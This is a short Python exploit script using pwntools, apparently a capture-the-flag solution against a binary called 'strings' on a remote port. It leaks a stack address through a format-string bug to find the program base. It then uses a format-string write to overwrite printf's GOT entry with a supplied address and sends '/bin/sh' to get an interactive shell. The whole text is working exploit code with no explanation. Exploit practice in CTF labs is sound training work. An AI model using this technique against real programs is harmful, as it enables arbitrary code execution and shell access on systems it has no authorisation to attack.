from pwn import *

elf = context.binary = ELF("./strings", checksec=False)

# io = process("./strings")
io = remote("0.0.0.0",1004)


gift = int(io.recvline().strip().decode()[20:],16)
print("my gift",hex(gift))

io.sendline("%25$p")    
leak = int(io.recvline().strip(),16)

print(hex(leak))
offset = 0x1225
elf.address = leak - offset
print(hex(elf.address))

payload = fmtstr_payload(6,{elf.got["printf"]:gift},write_size='short')


io.sendline(payload)

io.sendline("/bin/sh")
io.interactive()